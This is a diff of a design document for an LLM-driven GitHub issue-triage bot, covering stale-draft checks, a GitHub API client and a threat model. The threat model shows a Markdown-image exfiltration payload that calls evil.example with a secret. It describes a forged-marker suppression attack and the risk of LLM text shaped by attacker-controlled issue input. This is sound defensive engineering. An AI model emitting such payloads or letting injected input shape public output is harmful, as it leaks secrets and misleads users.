@@ -166,6 +166,7 @@ class Completeness(BaseModel):
   - Label errors with no effect on the reply: `bug_vague_version.json` logs `not_needed` although a traceback was given (expected `ok`); `bug_no_repro.json` repro `missing` vs expected `vague`.
   - Cost/latency: bugs now make two LLM calls (~5–8 s vs ~2.5–4 s for other types).
   - **Second run (2026-11-04, same model and prompt):** 11/15 exact, **1 false nag (same sample, repeated) + 1 missed ask**: `bug_crash_no_logs.json` logs `ok` although no error text is given — the first run got this right. **Run-to-run variation**: the slice 4 eval must use repeated runs (or many samples), not single results.
+  - **Known gap — comments aren't read** (found 2026-11-06 while designing the stale check): R3 sees only the issue title and body. If the reporter already gave the version (or logs) **in a comment before triage**, R3 still marks it missing and the bot asks for it again — a false nag. **Planned for R3 v2 (slice 4, module 12):** include the **reporter's own comments** in the completeness input (sanitised, truncated, delimited like the body). The stale check covers the *after*-triage case; this covers *before*.
   - **Decision:** record now; fix with real data in slice 4 rather than tuning the prompt on one sample. Candidate fix to test then: tighten the `logs` description — *"missing only when an error, exception or crash is explicitly described; wrong output alone → not_needed; if error text or a traceback is included → ok"* — bump to `completeness-v2`, and check it removes false nags **without** creating missed asks (e.g. `bug_crash_no_logs.json`).
 
 ### R4. Reproduction (sandbox) — via Agent
@@ -337,9 +338,10 @@ class DraftResponse(BaseModel):
   | Durable storage | `checkpointing.sqlite_checkpointer` (SQLite, local); Postgres in slice 7 | Own context manager so the allowlisted serializer is used |
   | Deserialization allowlist | `CHECKPOINT_CLASSES` | Includes `TriageState` (the `invoke()` input is stored) |
   | Run identity | `new_thread_id` → `owner/repo#N@timestamp` | One thread per run; re-triage cancels the waiting run |
-  | Post | `nodes/post.py` → local outbox | Idempotent per run (deterministic file + marker, atomic write); fails loudly without approval |
-  | Stale check | `stale_check` | **Stub** — real comparison with GitHub's `updated_at` in slice 4 |
-  | CLI | `triage`, `show`, `approve`, `edit`, `reject` | `--approver` = OS user until OAuth (slice 7) |
+  | Post | `nodes/post.py` → outbox (default) or GitHub (`POST_MODE=github`, slice 4) | Idempotent per run (outbox: deterministic file + atomic write; GitHub: marker search **since the run started**, `complete=True` → **fail closed** if the search is truncated); allowlist enforced in the node; fails loudly without approval; posted footer *"reviewed by a maintainer"* (no @mention until OAuth) |
+  | Retry | `githubtriage retry <ref>` | Approved run stuck before/at `post` (e.g. GitHub down): `invoke(None)` re-runs the failed step; the marker check makes it safe |
+  | Stale check | `stale_check` (slice 4) | Stale = **title/body differ from the triage snapshot**, or **any comment since the run started other than this run's own reply** — not GitHub's `updated_at`, which also moves for labels/assignees. This run's reply = author is the token's account **and** the body starts with `marker(thread)` (`is_this_runs_reply`, the same rule `post` uses to find its reply after a crash). A reply from another run counts as a change. Author alone isn't enough: a personal access token posts as its owner, so the maintainer's own comments share the bot's login. Found in a live test on the sandbox, where the maintainer's "System Info" comment was ignored and the stale draft was posted. A dedicated bot identity (GitHub App, slice 7) removes the overlap. Stale → `stale_reason` set, graph ends **without posting**, draft discarded, CLI asks the maintainer to re-triage. Local issue files (no `html_url`) skip it. GitHub errors → run stays at `stale_check` (never post unchecked); `retry` resumes |
+  | CLI | `triage`, `show`, `approve`, `edit`, `reject`, `retry` | `triage` accepts a file, `owner/repo#N` or an issue URL (slice 4); warns at triage time if posting would be refused; `--approver` = OS user until OAuth (slice 7) |
   | Proof | `tests/test_cli.py`, `test_graph.py` | Separate-"process" runs via SQLite; **crash inside `post` → resume → exactly one reply** |
 
 - **HITL as a label pipeline:** log every decision and edit diff — they become free ground truth and grow the eval set from real data.
@@ -541,6 +543,17 @@ Reporter opens issue ──► GitHub ──POST /webhook {action: "opened", iss
   - Tests: an autouse fixture forces tracing off — tests never upload traces.
   - Keys: personal access token for local dev (project `githubtriage-dev`); a workspace **service key** and project `githubtriage-prod` for the deployed service (slice 7).
 
+**GitHub API — our own small `httpx` client (`github_client.py`), slice 4.**
+- *Why not PyGithub:* we use ~5 endpoints; our own client keeps the HTTP details visible (headers, pagination, rate limits, retries) and is easy to fake with `httpx.MockTransport`. `httpx` was already installed (LangChain depends on it).
+- *Credentials:* one fine-grained PAT (sandbox repo only; Issues read/write; reads public repos for the eval set), `SecretStr`, unwrapped only to build the `Authorization` header; never in error messages (tested). Anonymous access works for public reads (60/hour, with a warning). Replaced by a GitHub App in slice 7.
+- *Typed errors:* `NotFoundError` (404 — also "private, no access"), `AuthError`, `RateLimitError(retry_after)`, `TruncatedError`; the CLI maps each to a message that says what to do.
+- *Retry policy — "could the request already have taken effect?":* rate limits → retry any method if the wait is ≤ 60s (the request was rejected, not processed); 5xx / network → GET only; never retry a POST (it may have been processed → duplicate comment; posting relies on the marker check instead); 4xx → never.
+- *Pagination:* follow the `Link` header's `rel="next"` exactly — GitHub's real next links use `/repositories/<id>/…` and a cursor (`after=`), not `page=N` (seen in the recorded fixtures). `max_pages` always; `complete=True` raises `TruncatedError` (fail closed) for safety checks.
+- *Testing, two layers:*
+  - **Hand-written fakes** (`MockTransport` + inline JSON) for behaviour and edge cases GitHub rarely shows on demand (502s, rate limits, 10 linked pages, forged markers).
+  - **Recorded fixtures** (`tests/fixtures/github/`, `test_recorded_github.py`): real responses captured read-only by `debug_helper_scripts/record_github_fixtures.py` at the transport layer, anonymised (logins → `maintainer1`/`userN`, user objects reduced to `{login, type}`, third-party bodies removed, e-mails replaced; the recorder refuses to write if a real login or the token survives, **or if the scenarios the tests rely on are no longer in the sandbox data** — e.g. sandbox #1 cleaned up — so a re-record can't quietly make the tests meaningless; sandbox #1 is kept as frozen evidence). They check our assumptions against what GitHub really sends. *Why both:* hand-written fakes share the code's assumptions — the stale-check bug (bot and maintainer are the same account with a PAT) passed every hand-written test and is now caught by a test on the recorded thread (verified by re-introducing the old rule).
+  - Re-record when GitHub may have changed; a failing recorded test then means our picture of the API is out of date.
+
 **User interfaces — two separate pages, one FastAPI service.**
 
 | | Approval page (R6) | Public demo page |
@@ -600,6 +613,7 @@ Reporter opens issue ──► GitHub ──POST /webhook {action: "opened", iss
 - **XSS in the approval page** — new HTML sink in slice 7.
 - **Data exfiltration via Markdown images** — `![x](https://evil.example/?d=SECRET)` sends data when the comment renders. Already blocked by the R5 URL allowlist (because it's an allowlist).
 - **Log injection** — newlines in a title forge log lines. Fixed by structured logging in Week 3.
+- **Forged idempotency marker — a suppression attack** (slice 4). The duplicate check searches the issue's comments for this run's hidden marker `<!-- githubtriage:<run id> -->`. Markers are invisible on the page but not secret (API, "Edit", page source), and **anyone can comment on a public issue**. A comment containing a copied marker would make us skip posting and adopt *their* comment as ours: the approved reply silently never appears. The run id's microsecond timestamp makes guessing impractical, but obscurity isn't a defence. **Decision:** only trust a marker in a comment written by **our own account** (`GET /user` → login, compared with each comment's author). Tested with a forged marker from another user. Editing or removing the marker in our posted comment is harmless: once posted, the run is finished and never searches again. Lesson: *a marker says what a comment claims to be; the author check proves who wrote it.*
 - **LLM-written text in public comments** (slice 2) — `FieldCheck.note` is written by the LLM from attacker-influenced input. If posted, it could carry mentions, links, Markdown images, injected headings, or a quoted secret from the reporter's logs. **Decision: allowlist, not cleaning.** The LLM only *chooses* the status (a `Literal`); the public wording comes from `REQUEST_PHRASES`, keyed by (field, status). The note stays in the state for maintainers (approval page, slice 7). Rejected alternative: stripping `@`/URLs/images/newlines from the note — a denylist that misses variants (full-width `＠`, `evil[.]example`, Unicode tricks). Trade-off accepted: slightly less specific wording for the reporter; maintainers can refine it before approving. Tested by `test_llm_note_is_never_posted`.
 
 #### Attacker goals (for prioritising)
@@ -609,7 +623,7 @@ Spam/harass under the project's name · phishing links · steal secrets · manip
 | Threat | Example | Defence |
 |---|---|---|
 | **S**poofing | Fake webhook; fake approver | HMAC signature check; GitHub OAuth + maintainer permission check |
-| **T**ampering | Issue edited after the draft was made | Stale-draft check on `updated_at` |
+| **T**ampering | Issue edited after the draft was made | Stale-draft check: title/body vs snapshot + new non-bot comments (not `updated_at`; see R6 implementation) |
 | **R**epudiation | "I never approved that" | `Decision` audit record |
 | **I**nformation disclosure | Secrets in sandbox output, logs, traces | No secrets in sandbox/state; redaction |
 | **D**enial of service | Huge issues, issue floods, fork bombs | Truncation, rate limits, budget + kill switch, sandbox limits |
